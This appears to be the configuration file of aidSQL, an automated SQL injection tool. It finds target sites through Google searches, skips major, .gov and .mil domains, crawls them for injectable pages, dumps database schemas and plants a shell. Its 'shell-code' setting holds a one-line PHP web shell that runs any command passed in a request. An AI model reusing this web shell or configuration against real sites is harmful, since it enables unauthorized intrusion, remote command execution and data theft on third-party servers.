	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;aidSQL Specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	classpath					=	lib/aidSQL/class								;Where to find classes
	sqli-plugins				=	all												;Which plugins shall we try when performing injection
	info-plugins				=	all												;Which plugins shall we try when gathering information
	shell-code					=	"<?php passthru($_REQUEST["cmd"]);?>"	;Set shell code
	;shell-name					=	"put-shell-name-here.php"					;Shell name
	;no-shell																			;Do not attempt to gain shell access
	shuffle						=	0													;Shuffle site list
	verbose						=	1													;Show all injection requests
	;request-interval			=	500												;How often will requests be performed (in microseconds)
																							;i.e 1000ms = 1second
	decode-requests			=	1													;Show decoded requests on output

	url-query-char				=	'?'												;URL query separator
	url-var-char				=	'&'												;URL var separator
	url-equality-char			=	'='												;URL equality separator
	url-path-char				=	'/'												;URL path separator

	;ignore-variables			=	var1,var2,var3									;This means that when these variables are found theyre ommited

; regex for omitting sites when googlin' do not forget to add quotes

	omit-sites					=		"mysql\.com|\.gov|\.mil|php\.net|joomla.*|oscommerce.*|youtube|wiktionary|wikipedia|amazon|urbandictionary|facebook|drupal|stackoverflow|forum.*|foros|hotscripts|deviantart|imdb|wiki|sourceforge\.net|phpbb.com"

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;Connection specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	http-adapter				=		Ecurl		;It's all there is for now and should be enough
	http-method					=		GET		;Http method
	;http-ignore-errors							;Wheter to ignore 500 and other request that are not 200 (OK)
	connect-timeout			=		60			;0 = wait forever, N = Wait for N amount of seconds
	follow-redirects			=		1			;Follow 302 requests yes = 1 | no = 0

	;proxy-server    			=		127.0.0.1
	;proxy-port      			=		8118
	;proxy-type					=		socks5		;this should be socks5 | http. Most common is http
	;proxy-tunnel				=		1			;0 Do not use CONNECT | 1 Use Connect method
	;proxy-auth					=		basic		;This can be NTLM or BASIC, most users will
														;need basic here, however if youre running
														;this on a windows machine you might need NTLM
	;proxy-user      			=		proxy-user-here
	;proxy-password  			=		proxy-password-here

	;proxy-file					=		""			;future feature
	;proxy-backconnect		=		""			;another future feature
	

	immediate-mode				=		yes		;As soon as it finds a vulnerable spot will stop processing

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;Logging specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	log-path						=		logs		;specify a path where to save logs
	colors						=		1					;Use colored shell output or not
	log-prepend-date			=		0					;wether to prepend date to the shell log or not (can be annoying)
	;save-log												;Save logs to log file.
																;and is just provided *here* for documentation purposes.

	;save-html												;save as html
	;save-xml												;save as xml
	;html-tpl					=		templates/html/basic.tpl	;specify a template to generate the html

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;Google specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	
	;google-language			=		en		;Search in this language
	;google-offset				=		0		;to set a search start offset (Use with care or you can end up with no sites)
	;google-max-results		=		200	;Maximum amount of google results

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;Web Crawler specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;omit-paths					=		/some/useless/path,/some/other/useless/path	;Exclude these paths
	;omit-pages					=		/some/page.php	;This is pretty similar to path, except that path excludes an entire path
																;but page will only exclude a single page

	page-types					=		php,asp,aspx,cfm,do,jsp,htm,html	;List of page types which are of interest to us
	max-links					=		100		;Some sites can be really massive and sometimes have links with different names
														;which are just actually product of URL rewriting mechanisms.
														;This parameter limits that quantity to a max, if set to 0, the whole site will
														;be crawled, (if 0, this can be *very* slow)

	;lpp							=		0			;How many links should we grab per crawled page (default is to fetch all)

	
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;Plugin specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	plugin-info-load-order	=	defaults,apache

	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;SQLi specific options
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	schema			=	complete											;This can be one of [complete,partial,none]
	ommit-schemas	=	information_schema,mysql					;Schemas you might want to ommit when fetching schemas

	wanted-schemas	=	{current}										;Valid options: 
																				;{current}	:	database where the injection has been found
																				;{all}		:	all databases
																				;db1,db2,db3:	List of databases delimited by commas
